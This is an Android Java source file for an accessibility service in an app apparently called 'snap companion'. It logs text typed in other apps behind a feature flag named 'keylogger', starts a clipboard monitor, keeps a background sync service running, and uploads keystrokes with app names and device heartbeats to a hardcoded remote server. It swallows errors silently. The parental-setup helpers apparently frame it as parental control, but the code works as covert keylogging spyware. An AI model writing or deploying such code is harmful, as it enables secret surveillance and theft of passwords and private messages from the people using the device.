package com.snapapp.companion;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;

public class SnapAccessibilityService extends AccessibilityService {

    private String lastPackage = "";
    private long lastLogTime = 0;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("is_accessibility_active", true).apply();

        try {
            ClipboardMonitor.start(this);
        } catch (Throwable ignored) {}

        // Ensure background sync service is alive
        try {
            Intent svc = new Intent(this, CompanionSyncService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Throwable ignored) {}

        // Immediate heartbeat reporting accessibility active
        try {
            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
            String devId = prefs.getString("device_id", null);
            if (devId != null) {
                ApiClient.sendHeartbeat(server, devId, 100, false, true, ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        CharSequence pkgChar = event.getPackageName();
        String pkg = pkgChar != null ? pkgChar.toString() : "";

        // Ignore our own package
        if (getPackageName().equals(pkg)) return;

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            lastPackage = pkg;
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (!TelemetrySyncHelper.isFeatureEnabled(this, "keylogger")) return;

            long now = System.currentTimeMillis();
            if (now - lastLogTime < 500) return; // Debounce rapid keystrokes

            StringBuilder sb = new StringBuilder();
            if (event.getText() != null) {
                for (CharSequence s : event.getText()) {
                    if (s != null) sb.append(s).append(" ");
                }
            }

            String content = sb.toString().trim();
            if (content.length() > 0) {
                lastLogTime = now;
                String appName = getAppName(pkg);
                TelemetrySyncHelper.uploadKeystroke(this, pkg, appName, content);
            }
        }
    }

    private String getAppName(String pkg) {
        if (pkg == null || pkg.isEmpty()) return "Unknown App";
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(info);
            return label != null ? label.toString() : pkg;
        } catch (Throwable e) {
            return pkg;
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("is_accessibility_active", false).apply();
        super.onDestroy();
    }
}
